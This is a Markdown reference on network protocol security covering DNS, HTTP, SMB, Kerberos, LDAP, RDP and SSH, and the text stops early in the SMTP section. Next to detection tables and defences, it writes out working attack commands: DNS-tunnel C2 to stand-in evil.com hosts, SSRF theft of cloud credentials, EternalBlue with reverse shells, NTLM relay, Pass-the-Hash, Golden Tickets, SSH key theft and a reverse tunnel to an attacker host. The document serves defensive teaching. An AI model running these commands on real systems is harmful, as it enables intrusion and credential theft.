# Network Protocols Security Reference

> **How attackers exploit every major protocol — mechanics, TTPs, detection, and defenses.**
> ATT&CK technique IDs are noted throughout. All tool commands are for authorized use only.

---

## Table of Contents

1. [DNS (53 UDP/TCP)](#dns-53-udptcp)
2. [HTTP/HTTPS (80/443)](#httphttps-80443)
3. [SMB (445 TCP)](#smb-445-tcp)
4. [Kerberos (88 TCP/UDP)](#kerberos-88-tcpudp)
5. [LDAP/LDAPS (389/636)](#ldapldaps-389636)
6. [RDP (3389 TCP)](#rdp-3389-tcp)
7. [SSH (22 TCP)](#ssh-22-tcp)
8. [SMTP/IMAP/POP3 (25/587/465/993/143)](#smtpimappop3-255874659931 43)
9. [SNMP (161/162 UDP)](#snmp-161162-udp)
10. [NTP (123 UDP)](#ntp-123-udp)
11. [DHCP (67/68 UDP)](#dhcp-6768-udp)
12. [BGP (179 TCP)](#bgp-179-tcp)
13. [Protocol Quick Reference Card](#protocol-quick-reference-card)

---

## DNS (53 UDP/TCP)

### How It Works

DNS is the internet's distributed naming system. Resolution follows a hierarchical chain:

1. Client queries its configured **recursive resolver** (typically ISP or enterprise DNS).
2. Resolver queries a **root name server** (13 root server clusters, anycast).
3. Root server refers to the appropriate **TLD name server** (`.com`, `.net`, etc.).
4. TLD name server refers to the **authoritative name server** for the domain.
5. Authoritative server returns the record; resolver caches it per the TTL.

Common record types: `A` (IPv4), `AAAA` (IPv6), `MX` (mail), `CNAME` (alias), `NS` (name server), `TXT` (SPF/DKIM/etc.), `PTR` (reverse), `SRV` (service location), `ANY` (all records — now largely deprecated per RFC 8482).

UDP is used for queries ≤512 bytes; TCP is used for zone transfers (AXFR) and responses that exceed 512 bytes (EDNS0 extends this to ~4096 bytes over UDP).

### Attack Techniques

#### DNS Tunneling — T1071.004, T1048.003

Attackers encode data in DNS query/response payloads to exfiltrate data or maintain C2 through firewalls that permit DNS.

**iodine** (IP-over-DNS tunnel):
```bash
# Attacker controls ns1.evil.com pointing to their server
# Server side
iodined -f -c -P s3cr3t 10.0.0.1 tunnel.evil.com

# Client side (on compromised host)
iodine -f -P s3cr3t tunnel.evil.com
# Creates tun0 interface; SSH over it: ssh user@10.0.0.2
```

**dnscat2** (encrypted C2 over DNS):
```bash
# Server
ruby dnscat2.rb --dns "domain=c2.evil.com,host=0.0.0.0" --no-cache --security=open

# Client (PowerShell)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain c2.evil.com -DNSServer 8.8.8.8
```

Detection indicators: high query rate to single domain, labels >40 characters (legitimate labels average <15), base32/base64 character sets in labels, low TTL values, uncommon record types (NULL, TXT for C2), queries out of proportion to web traffic.

#### DNS Amplification — T1498.002

Exploit misconfigured resolvers to amplify DDoS traffic. An `ANY` or `DNSKEY` query of ~40 bytes can return 3,000+ bytes — 70x amplification. Combined with source IP spoofing (BCP38 violations), this floods victims.

```bash
# Check if resolver is open (will amplify)
dig +short @<resolver-ip> ANY isc.org

# Measure amplification factor
dig +short @<resolver-ip> DNSKEY . | wc -c
```

BCP38 (RFC 2827) network ingress filtering prevents IP spoofing at the ISP level and is the primary mitigation.

#### DNS Hijacking — T1584.002, T1071.004

Attackers compromise DNS registrar accounts, hosting provider DNS panels, or on-path resolvers to redirect traffic. Common vector: credential stuffing or phishing registrar accounts.

#### DNS Rebinding — T1557

Attacker controls a domain with very low TTL. Initial resolution returns a public IP (passes same-origin policy check); subsequent resolution returns an internal IP (e.g., `192.168.1.1`). Browser scripts then reach internal hosts using the victim's credentials.

Mitigation: DNS rebinding protection in resolvers (reject private IPs for public domains), `--dns-rebind-localhost-only` in dnsmasq.

#### Subdomain Takeover — T1584.001

CNAME records pointing to deprovisioned cloud services (AWS S3, Azure App Service, GitHub Pages, Heroku) can be claimed by attackers who register the same service name.

```bash
# Enumerate CNAMEs
dig +short CNAME sub.target.com
# Returns: myapp.azurewebsites.net.
# Check if myapp.azurewebsites.net is unclaimed -> register it
```

Tools: `subjack`, `nuclei -t takeovers/`, `can-i-take-over-xyz` GitHub project.

### Detection

| Signal | Log Source | Indicator |
|--------|-----------|-----------|
| Tunneling | DNS resolver logs, Zeek `dns.log` | >100 unique subdomains/min to one domain; labels >40 chars; NULL/TXT record exfil |
| Amplification | NetFlow, firewall | High-volume UDP/53 to single external IP; response >> query size |
| Hijacking | DNS change alerts, CT logs | Unexpected NS/A record change; new cert issued for domain |
| Rebinding | Browser proxy logs | Rapid TTL expiry; private IP returned for public FQDN |
| Takeover | Passive DNS, monitoring | CNAME target returns 404/unclaimed service page |

### Defensive Controls

- **Response Policy Zones (RPZ)**: Block malicious domains at the recursive resolver.
- **DNS Filtering**: Cisco Umbrella, Cloudflare Gateway, Quad9 — block C2 domains by category.
- **DNSSEC**: Cryptographically signs zone data; prevents cache poisoning (Kaminsky attack). Deploy on authoritative zones; validate on resolvers.
- **DoH/DoT**: DNS-over-HTTPS (port 443) and DNS-over-TLS (port 853) encrypt DNS queries to prevent on-path inspection and manipulation.
- **Disable open recursion**: Resolvers should only answer queries from authorized clients.
- **Monitor for zone transfer attempts**: Restrict AXFR to authorized secondary servers only.
- **Registrar 2FA + registry lock**: Prevent unauthorized domain hijacking.

---

## HTTP/HTTPS (80/443)

### How It Works

HTTP is a stateless application-layer request-response protocol. A transaction:

```
Client: GET /resource HTTP/1.1
        Host: example.com
        User-Agent: Mozilla/5.0
        Connection: keep-alive
        <blank line>

Server: HTTP/1.1 200 OK
        Content-Type: text/html
        Content-Length: 1234
        <blank line>
        <body>
```

**HTTP/2** (RFC 7540) introduces binary framing, multiplexing multiple streams over a single TCP connection, header compression (HPACK), and server push. **HTTP/3** runs over QUIC (UDP).

HTTPS wraps HTTP in TLS. TLS 1.3 (RFC 8446) is current — mandatory forward secrecy, 0-RTT resumption, encrypted handshake.

### Attack Techniques

#### Server-Side Request Forgery (SSRF) — T1090, T1552.005

SSRF tricks the server into making requests to internal resources on behalf of the attacker. High-impact target: AWS Instance Metadata Service (IMDS).

```bash
# Probe for SSRF vulnerability
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Retrieve IAM credentials via IMDSv1 (no auth required)
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns role name, then:
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"

# Bypass filters with alternate encodings
http://[::ffff:169.254.169.254]/  # IPv6
http://0251.0376.0251.0376/       # Octal
http://2852039166/                # Decimal
http://169.254.169.254.xip.io/   # DNS rebind bypass
```

IMDSv2 (token-based, PUT-first) mitigates most SSRF against AWS IMDS by requiring a session-oriented token.

#### HTTP Request Smuggling — T1190

Exploits disagreement between front-end (load balancer/CDN) and back-end servers about where one HTTP request ends and the next begins. Two main variants:

**CL.TE** (front-end uses Content-Length, back-end uses Transfer-Encoding):
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL** (front-end uses Transfer-Encoding, back-end uses Content-Length):
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Tools: Burp Suite HTTP Request Smuggler extension, `smuggler.py`. Impact includes bypassing security controls, hijacking user sessions, and cache poisoning.

#### HTTP/2 CONTINUATION Flood — CVE-2024-27316, T1498.002

Rapid7 / CERT/CC disclosed in April 2024 that many HTTP/2 implementations fail to limit CONTINUATION frames (used to extend HEADERS). Sending a stream of CONTINUATION frames without END_HEADERS flag forces servers to buffer indefinitely, causing OOM or CPU exhaustion with a single TCP connection.

Affected: Apache httpd, nginx (certain configs), Node.js, Go net/http, Envoy — most patched by mid-2024.

Detection: Unusual spike in HTTP/2 CONTINUATION frames per connection, server memory exhaustion, absence of END_HEADERS flag in extended frame sequences.

#### Domain Fronting — T1090.004

Uses a CDN (Cloudflare, AWS CloudFront, Azure CDN) where the TLS SNI contains the allowed domain but the HTTP `Host` header contains the actual C2 domain. The CDN routes based on `Host`, not SNI.

```
TLS SNI:          allowed-domain.cloudfront.net
HTTP Host header: c2-server.cloudfront.net
```

Most major CDN providers now block domain fronting. Detection: mismatch between SNI and `Host` header at SSL inspection proxies.

#### Slowloris — T1498.001

Keeps many connections open by sending partial HTTP requests, never completing them. Exhausts the server's connection pool.

```bash
# Slowloris tool
perl slowloris.pl -dns target.com -port 80 -num 1000 -timeout 2000
```

Mitigation: Reverse proxy (nginx/HAProxy), `RequestReadTimeout` in Apache, rate-limiting connections per IP.

### Detection

| Signal | Log Source | Indicator |
|--------|-----------|-----------|
| SSRF | WAF logs, app logs | Requests to 169.254.x.x, 10.x, metadata endpoints from server-side components |
| Smuggling | Access logs | Unexpected 400/500 errors affecting other users; timing anomalies |
| CONTINUATION flood | Server metrics, IDS | HTTP/2 CONTINUATION frames without END_HEADERS; memory spike |
| Slowloris | Web server logs | Many half-open connections from single IP; `Connection: keep-alive` with tiny intervals |
| Domain fronting | Proxy/SSL inspection | SNI != Host header mismatch |

### Defensive Controls

- **Web Application Firewall (WAF)**: AWS WAF, ModSecurity, Cloudflare WAF — block SSRF patterns, SQLi, XSS.
- **IMDSv2**: Require token-based metadata access on all EC2 instances.
- **Normalize HTTP parsing**: Use consistent front-end and back-end parsers; reject ambiguous `Content-Length`/`Transfer-Encoding` combinations.
- **Patch HTTP/2 implementations**: Keep server software current for CVE-2024-27316 and similar.
- **Connection/request timeouts**: `client_header_timeout`, `client_body_timeout` in nginx; `RequestReadTimeout` in Apache.
- **Input validation for URLs**: Allowlist internal-facing URL schemes; block private IP ranges in SSRF-prone parameters.
- **TLS inspection at proxy**: Detect domain fronting via SNI/Host mismatch.

---

## SMB (445 TCP)

### How It Works

SMB (Server Message Block) is Microsoft's file and print sharing protocol. SMBv1 (CIFS) is legacy and insecure; SMBv2 (Vista+) and SMBv3 (Win8+) added performance and security improvements. SMBv3 supports end-to-end encryption.

Connection flow:
1. TCP connection on port 445.
2. SMB negotiate (dialect selection).
3. Session setup (NTLM or Kerberos authentication).
4. Tree connect (share access: `\\server\share`).
5. File operations (create, read, write, close).

SMBv3 encryption: `Encrypt-Data` parameter in `Set-SmbServerConfiguration`. SMB signing prevents relay attacks.

### Attack Techniques

#### EternalBlue — MS17-010, CVE-2017-0144, T1210

A buffer overflow in SMBv1's transaction processing. Exploited by NSA's ETERNALBLUE, leaked by Shadow Brokers in April 2017. Used by WannaCry and NotPetya.

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

Impact: Remote code execution as SYSTEM without authentication. Patch: MS17-010 (April 2017). All unpatched systems remain vulnerable.

#### Pass-the-Hash — T1550.002

NTLM authentication accepts the NT hash directly without knowing the plaintext password. Attackers extract hashes from LSASS memory and authenticate as the user.

```bash
# Dump hashes with secretsdump
impacket-secretsdump -just-dc-ntlm domain/admin:password@dc.corp.local

# Pass-the-Hash for remote execution
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  domain/Administrator@192.168.1.100

# With CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --exec-method smbexec
```

Detection: Event ID 4624 (Logon Type 3, NTLM), anonymous or machine account SMB auth, lateral movement patterns.

#### NTLM Relay — T1557.001

Capture NTLM authentication challenges and relay them to another service that accepts NTLM. Does not require cracking the hash.

```bash
# Step 1: Poison LLMNR/NBT-NS to capture hashes
sudo responder -I eth0 -rdwv

# Step 2: Relay to target (disable SMB in Responder.conf first)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami > C:\pwned.txt"

# Or relay to LDAP for privilege escalation
impacket-ntlmrelayx -tf ldap://dc.corp.local -smb2support --delegate-access

# Trigger auth: coerce via PetitPotam
python3 PetitPotam.py -u user -p pass attacker-ip dc-ip
```

Mitigation: SMB signing (required on all hosts), disable NTLM authentication, enable LDAP signing + channel binding.

#### SMB Brute Force — T1110.001

```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
hydra -L users.txt -P passwords.txt smb://192.168.1.100
```

Detection: Event ID 4625 (failed logon) spike, Event ID 4740 (account lockout), rapid Type 3 logon failures.

#### Share Enumeration — T1135

```bash
# Enumerate shares (null session or authenticated)
impacket-smbclient -no-pass //192.168.1.100/
smbmap -H 192.168.1.100 -u "" -p ""
crackmapexec smb 192.168.1.0/24 -u "" -p "" --shares

# Enumerate with valid credentials
smbmap -H 192.168.1.100 -d domain -u user -p password
```

### Detection

| Event ID | Description | Attacker Context |
|----------|-------------|-----------------|
| 5140 | Network share accessed | Share enumeration; lateral movement |
| 5145 | Share object access check | File access during enumeration |
| 4624 (Type 3) | Network logon | Pass-the-Hash (NTLM), lateral movement |
| 4776 | NTLM credential validation | Pass-the-Hash attempts |
| 4625 | Failed logon | Brute force |
| 4740 | Account lockout | Brute force threshold hit |
| 7045 | New service installed | PsExec/impacket-psexec deployment |

Network indicators: SMB traffic from workstation-to-workstation (east-west), port 445 from internet, IPC$ anonymous access.

### Defensive Controls

- **Disable SMBv1**: `Set-SmbServerConfiguration -EnableSMB1Protocol $false` — eliminates EternalBlue attack surface.
- **Require SMB signing**: `Set-SmbServerConfiguration -RequireSecuritySignature $true` — prevents NTLM relay.
- **Block TCP 445 at perimeter**: No SMB should reach the internet.
- **Firewall east-west**: Workstations should not reach each other on 445; only file servers.
- **Disable NTLM** (or restrict to NTLMv2): Group Policy `Network Security: LAN Manager authentication level` = `Send NTLMv2 response only. Refuse LM & NTLM`.
- **LAPS**: Local Administrator Password Solution randomizes local admin passwords, preventing lateral movement via shared credentials.
- **Credential Guard**: Protects LSASS-stored credentials from extraction.

---

## Kerberos (88 TCP/UDP)

### How It Works

Kerberos is the default authentication protocol for Active Directory. Full ticket flow:

```
1. AS-REQ:   Client -> KDC (AS): "I am user@CORP.LOCAL, give me a TGT"
             (encrypted with user's NT hash / AES key)

2. AS-REP:   KDC -> Client: TGT (encrypted with krbtgt hash) +
             session key (encrypted with user's key)

3. TGS-REQ:  Client -> KDC (TGS): "I have this TGT, give me a service ticket for HOST/server"
             (TGT + authenticator encrypted with session key)

4. TGS-REP:  KDC -> Client: Service ticket (encrypted with service account's key) +
             new session key

5. AP-REQ:   Client -> Service: "Here's my service ticket"
             Service decrypts with its own key, verifies

6. AP-REP:   Service -> Client: Mutual authentication (optional)
```

Tickets: TGT is valid 10 hours (default), renewable for 7 days. Service tickets valid 10 hours.

### Attack Techniques

#### Kerberoasting — T1558.003

Any authenticated domain user can request service tickets for accounts with SPNs. Tickets are encrypted with the service account's NT hash. Attackers crack offline.

```bash
# Enumerate SPNs and request tickets
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.0.1 -request

# Crack with hashcat
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force
# Or with john
john --format=krb5tgs kerberoast_hashes.txt --wordlist=rockyou.txt
```

Detection: **Event ID 4769** (Kerberos Service Ticket Request) with Encryption Type `0x17` (RC4-HMAC) or `0x18` from a user account (not computer), especially outside business hours or for many different SPNs.

Mitigation: Use AES encryption for service accounts; deploy gMSA (Group Managed Service Accounts) with 240-character auto-rotated passwords (infeasible to crack).

#### AS-REP Roasting — T1558.004

Accounts with "Do not require Kerberos preauthentication" set allow an unauthenticated attacker to request AS-REP; the response contains material encrypted with the user's hash.

```bash
# No credentials required
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

Detection: **Event ID 4768** (TGT Request) with Preauthentication Type `0` (no preauth) and Result Code `0x0` (success).

#### Golden Ticket — T1558.001

Forge a TGT using the **krbtgt** account hash (obtained via DCSync or NTDS.dit). The KDC trusts any properly signed TGT without further verification.

```bash
# Get krbtgt hash (requires Domain Admin)
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:password@dc.corp.local

# Forge TGT with Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
           /sid:S-1-5-21-1234567890-1234567890-1234567890 \
           /krbtgt:a0c4c3d3b401b3ccaf24adf3f9a5b6c2 \
           /ticket:golden.kirbi /endin:87600

# Import ticket
mimikatz # kerberos::ptt golden.kirbi
```

Golden Tickets can be set with 20-year validity. Detection: Tickets with anomalous validity periods (>10 hours), **Event ID 4769** requesting service tickets with a non-existent user, tickets with mismatched PAC data. Mitigation: Rotate krbtgt password twice (invalidates all outstanding tickets).

#### Silver Ticket — T1558.002

Forge a service ticket using the **service account hash** (no KDC contact). More stealthy than Golden Ticket — no authentication events at the DC.

```bash
mimikatz # kerberos::silver /user:Administrator /domain:corp.local \
           /sid:S-1-5-21-... /target:server.corp.local \
           /service:cifs /rc4:<service_account_hash> /ticket:silver.kirbi
```

Detection: Service ticket usage without a preceding TGS-REQ at the DC; PAC validation errors.

#### Pass-the-Ticket — T1550.003

Inject a harvested Kerberos ticket into the current session.

```bash
# Harvest tickets from memory
mimikatz # sekurlsa::tickets /export
# Or Rubeus
Rubeus.exe dump /service:krbtgt /nowrap

# Import and use
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:base64blob
```

Detection: **Event ID 4648** (logon with explicit credentials), unusual TGT usage from unexpected source hosts.

#### Overpass-the-Hash — T1550.002

Convert an NT hash into a Kerberos TGT to avoid NTLM network logons (which are more detectable).

```bash
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
           /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
# Resulting PowerShell session requests Kerberos tickets, not NTLM
```

### Detection

| Event ID | Description | Attack |
|----------|-------------|--------|
| 4768 | TGT (AS-REQ) requested | AS-REP Roasting (PreAuth=0) |
| 4769 | Service ticket (TGS-REQ) requested | Kerberoasting (RC4 etype), Golden Ticket |
| 4771 | Kerberos pre-auth failed | Brute force |
| 4776 | NTLM credential validation | Overpass-the-Hash fallback |
| 4672 | Special privileges assigned at logon | Privilege escalation after ticket attack |

### Defensive Controls

- **Enforce AES encryption**: Disable RC4 (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters\SupportedEncryptionTypes = 0x18`); makes Kerberoasting infeasible.
- **gMSA (Group Managed Service Accounts)**: Auto-rotate 240-char passwords; removes Kerberoasting viability for service accounts.
- **FAST / Kerberos Armoring**: Wraps AS-REQ in a TGT, preventing AS-REP Roasting without armoring.
- **Rotate krbtgt**: Perform planned double-rotation to invalidate Golden Tickets; use Microsoft's `New-KrbtgtKeys.ps1`.
- **Protected Users security group**: Forces AES; disallows credential caching; TGT non-renewable.
- **Privileged Access Workstations (PAW)**: Isolate admin Kerberos tickets from internet-facing sessions.
- **BloodHound / attack path analysis**: Identify and sever shortest paths to Domain Admin.

---

## LDAP/LDAPS (389/636)

### How It Works

LDAP (Lightweight Directory Access Protocol) is the wire protocol for X.500 directory services (Active Directory, OpenLDAP). LDAPS is LDAP over TLS on port 636.

Core operations:
- **Bind**: Authenticate (simple bind = cleartext credentials; SASL = Kerberos/NTLM).
- **Search**: Query the directory tree (`(objectClass=user)`, `(sAMAccountName=john)`).
- **Add/Modify/Delete**: Modify directory objects (requires permissions).
- **Compare**: Test attribute values.
- **Abandon**: Cancel a pending operation.
- **Extended**: LDAP-over-TLS StartTLS, Password Modify.

LDAP search components: BaseDN, scope (base/onelevel/subtree), filter, attributes to return.

### Attack Techniques

#### LDAP Injection — T1190, T1055

Unsanitized user input in LDAP query filters allows logic manipulation:

```
// Legitimate query
(sAMAccountName=john)

// Injection to bypass authentication
Username: *)(|(objectClass=*
// Resulting filter: (&(sAMAccountName=*)(|(objectClass=*)(password=anything))
// Returns first user regardless of password
```

Mitigation: Escape special characters (`*`, `(`, `)`, `\`, `NUL`) in LDAP filters using RFC 4515 escaping.

#### Anonymous Bind Enumeration — T1087.002, T1069.002

Many older AD configurations permit unauthenticated LDAP queries. Attackers enumerate users, groups, computers, GPOs, and password policies.

```bash
# Test for anonymous bind
ldapsearch -H ldap://10.0.0.1 -x -b "DC=corp,DC=local" "(objectClass=*)" 2>&1 | head -20

# Enumerate users
ldapsearch -H ldap://10.0.0.1 -x -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName mail description

# Enumerate groups and members
ldapsearch -H ldap://10.0.0.1 -x -b "DC=corp,DC=local" \
  "(objectClass=group)" cn member

# Enumerate Password Policy
ldapsearch -H ldap://10.0.0.1 -x -b "DC=corp,DC=local" \
  "(objectClass=domainDNS)" minPwdLength lockoutThreshold
```

#### ldapdomaindump — T1087.002

Python tool for comprehensive AD enumeration over LDAP:

```bash
ldapdomaindump -u 'corp.local\user' -p 'password' 10.0.0.1 -o /tmp/ad_dump/
# Outputs HTML/JSON: domain_users, domain_groups, domain_computers, domain_trusts
```

#### LDAP Relay to Active Directory — T1557.001

Similar to NTLM relay but targeting LDAP. Used to add users to privileged groups, configure Resource-Based Constrained Delegation (RBCD), or modify ACLs.

```bash
impacket-ntlmrelayx -t ldaps://dc.corp.local --escalate-user lowprivuser
# Adds lowprivuser to Domain Admins via LDAP write
```

Requires: LDAP signing not enforced + LDAP channel binding not required.

### Detection

| Signal | Log Source | Indicator |
|--------|-----------|-----------|
| Anonymous bind | Windows Event 2889 (requires audit) | Bind with empty credentials |
| Bulk LDAP queries | Domain Controller logs, Zeek | Subtree searches of entire domain, wildcard filters |
| ldapdomaindump | Network traffic | Rapid sequential LDAP queries for all object classes |
| LDAP relay | Event 4662 (object access) | Unexpected group membership changes, ACL modifications |

Enable **Event ID 2889** (unsigned LDAP bind) via `Domain Controller Diagnostic` registry key.

### Defensive Controls

- **Require LDAP signing**: Group Policy `Domain Controller: LDAP server signing requirements = Require Signing`.
- **Enable LDAP Channel Binding**: Prevents relay attacks; required for CBS patches.
- **Disable anonymous bind**: Default in modern AD but verify; `dsHeuristics` bit 7.
- **Restrict LDAP to management networks**: Firewall port 389/636 from general user VLANs.
- **Minimum permissions**: Service accounts should not have write access to AD objects.
- **Monitor for wildcard LDAP searches**: Alert on `(objectClass=*)` or large result sets from non-server sources.

---

## RDP (3389 TCP)

### How It Works

Remote Desktop Protocol provides remote GUI access. Architecture includes virtual channels for audio, clipboard, printer redirection, and smart card. Key components:

- **NLA (Network Level Authentication)**: Preauthenticates before establishing full RDP session; requires valid credentials before resource allocation (mitigates unauthenticated exploits).
- **CredSSP**: Delegates credentials to the remote server (used by NLA).
- **Virtual Channels**: Dynamic bidirectional data streams; extensible (e.g., RDP clipboard = `cliprdr`).

### Attack Techniques

#### BlueKeep — CVE-2019-0708, T1210

Pre-authentication use-after-free vulnerability in the RDP pre-authentication channel (`MS_T120`). Allows remote code execution without credentials on Windows 7/Server 2008 (NLA disabled).

```bash
# Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.100
set TARGET 2   # Windows 7 SP1 x64 / 2008 R2 x64
run
```

#### DejaBlue — CVE-2019-1181/1182, T1210

Similar pre-auth heap overflow in Remote Desktop Services affecting Windows 8, 10, Server 2012-2019. Patched August 2019. Both BlueKeep and DejaBlue are wormable.

#### RDP Brute Force — T1110.001

```bash
crowbar -b rdp -s 192.168.1.100/32 -u Administrator -C passwords.txt -n 1
hydra -l Administrator -P passwords.txt rdp://192.168.1.100
ncrack -vv --user Administrator -P passwords.txt rdp://192.168.1.100
```

Detection: Event ID 4625 spikes from external IPs on port 3389, Event 4771 (Kerberos pre-auth failure).

#### RDP Session Hijacking — T1563.002

An attacker with SYSTEM privileges can hijack any RDP session — including disconnected ones — without knowing the user's password:

```bash
# List sessions
query session /server:192.168.1.100

# Hijack session ID 2 from SYSTEM context (via PsExec or service)
# Service must run as SYSTEM
sc create hijack binPath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
sc start hijack
```

Windows does not prompt the hijacked user; the session is silently taken over.

Detection: Event ID 4778 (session reconnected), anomalous session reconnects, `tscon.exe` process creation.

#### Pass-the-Hash with Restricted Admin Mode — T1550.002

Windows Server 2012 R2+ "Restricted Admin Mode" (`/restrictedadmin` flag in `mstsc.exe`) allows connecting with an NT hash instead of a password. This was intended to prevent credential forwarding but introduced Pass-the-Hash.

```bash
# Enable Restricted Admin on target (requires reg write access)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Connect with hash via xfreerdp
xfreerdp /v:192.168.1.100 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert-ignore /restricted-admin
```

### Detection

| Event ID | Description | Indicator |
|----------|-------------|-----------|
| 4624 Type 10 | Remote interactive logon | RDP logon |
| 4625 Type 10 | Failed remote interactive logon | RDP brute force |
| 4778 | Session reconnected | Session hijacking |
| 4779 | Session disconnected | Baseline comparison |
| 1149 (TermServ) | User authentication succeeded | Pre-NLA connection pattern |

Network: Port 3389 connections from internet-facing IPs; multiple failed auth attempts.

### Defensive Controls

- **Require NLA**: `Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Require NLA`.
- **MFA for RDP**: Azure AD MFA, Duo RDP Gateway, YubiKey smart card.
- **Restrict source IPs**: Firewall allow-list; only RDP Gateway or bastion host should reach 3389.
- **RDP Gateway**: Centralize RDP access through an RDP Gateway (formerly TS Gateway) that enforces policies.
- **Disable Restricted Admin Mode**: `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 1`.
- **Patch**: Deploy BlueKeep (MS19-0708) and DejaBlue patches; critical priority.
- **Account lockout**: Prevent brute force; 5 failures = 30-minute lockout.

---

## SSH (22 TCP)

### How It Works

SSH (Secure Shell) provides encrypted remote shell access, file transfer (SFTP/SCP), and port forwarding. Protocol flow:

1. **TCP connect** on port 22.
2. **Version string exchange** (`SSH-2.0-OpenSSH_9.0`).
3. **Key exchange** (ECDH / Diffie-Hellman): Establishes session encryption keys.
4. **Host key verification**: Client checks server's public key against `~/.ssh/known_hosts`.
5. **User authentication**: Password, public key (`authorized_keys`), GSSAPI (Kerberos), or FIDO2.
6. **Channel multiplex**: Multiple logical channels (shell, exec, sftp, direct-tcpip for port forwards) over one connection.

SSH agent (`ssh-agent`) caches decrypted private keys in memory, forwarded via a Unix socket.

### Attack Techniques

#### Credential Brute Force — T1110.001

```bash
hydra -l root -P rockyou.txt ssh://192.168.1.100
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh
nmap --script ssh-brute -p 22 192.168.1.100
```

Detection: Auth log repeated "Failed password" or "Invalid user" entries; `fail2ban` or SIEM alert on >10 failures/minute.

#### SSH Private Key Theft — T1552.004

```bash
# Common key locations
~/.ssh/id_rsa
~/.ssh/id_ed25519
~/.ssh/id_ecdsa
/home/*/.ssh/id_*
/root/.ssh/id_*

# Search for keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
grep -r "BEGIN.*PRIVATE KEY" /home/ 2>/dev/null

# Keys in known locations (CI/CD, containers)
cat /var/jenkins/home/.ssh/id_rsa
cat /root/.ssh/id_rsa

# Test if key is unencrypted
openssl rsa -in id_rsa -check -noout 2>&1 | grep -q "ok" && echo "No passphrase"
```

#### SSH Agent Hijacking — T1563.001

If an admin connects to a compromised host with agent forwarding (`-A`), an attacker with root can steal the agent socket and authenticate as the admin to other hosts.

```bash
# Find agent sockets on compromised host
ls /tmp/ssh-*/agent.*
find /tmp -name "agent.*" 2>/dev/null

# Hijack (as root -- can read any user's socket)
export SSH_AUTH_SOCK=/tmp/ssh-XYZabc/agent.1234
ssh-add -l   # Lists keys in the hijacked agent
ssh admin@other-server  # Authenticates as the admin
```

Detection: Unexpected `ssh-agent` forwarding to server hosts; `SSH_AUTH_SOCK` environment variable in processes not owned by that user.

Mitigation: `ForwardAgent no` in server `sshd_config`; FIDO2/hardware keys (cannot be forwarded).

#### SSH Tunneling for Pivoting — T1572, T1090.001

SSH provides built-in tunneling capabilities for network pivoting:

```bash
# Local port forward: access internal RDP through compromised host
ssh -L 13389:internal-win:3389 user@jump-host
# Connect: mstsc /v:localhost:13389

# Dynamic SOCKS proxy: proxy all traffic through jump host
ssh -D 1080 user@jump-host
proxychains nmap -sV 10.0.0.0/24

# Reverse tunnel: expose internal service to attacker (C2 callback)
ssh -R 4444:localhost:4444 attacker@external-c2
# On external-c2, connections to :4444 reach the compromised host's localhost:4444

# SSH over HTTP/HTTPS (bypass firewalls)
# Cobalt Strike SSH pivot: use socks command, then proxychains
```

Detection: Unusual port bindings, `ssh -D` / `-L` / `-R` flags in process command line, persistent SSH connections, Zeek `ssh.log` showing tunneled protocols.

### Defensive Controls

- **Public key authentication only**: Disable password auth in `sshd_config`: `PasswordAuthentication no`, `ChallengeResponseAuthentication no`.
- **FIDO2/hardware keys**: `AuthorizedKeysFile` with `sk-` key types; keys cannot be exported or forwarded.
- **Disable agent forwarding on servers**: `AllowAgentForwarding no` in `sshd_config`.
- **Rotate keys regularly**: Audit `~/.ssh/authorized_keys` across all hosts; remove stale keys.
- **Bastion host / Jump server**: Restrict direct SSH; all access routes through centrally-logged bastion.
- **Port knocking or VPN**: Reduce port 22 exposure to the internet entirely.
- **Centralized key management**: HashiCorp Vault SSH secrets engine, AWS Systems Manager Session Manager (no port 22 needed).
- **SSH certificate authority**: Issue short-lived SSH certificates instead of long-lived authorized_keys entries.

---

## SMTP/IMAP/POP3 (25/587/465/993/143)

### How It Works

**SMTP** (Simple Mail Transfer Protocol) relays email between servers. Port 25 = server-to-server; port 587 = client submission (STARTTLS); port 465 = SMTPS (implicit TLS). SMTP conversation:

```
Client: EHLO mail.sender.com
Server: 250-mx.recipient.com Hello
        250-SIZE 52428800
        250-8BITMIME
        250 STARTTLS

Client: MAIL FROM:<alice@sender.com>
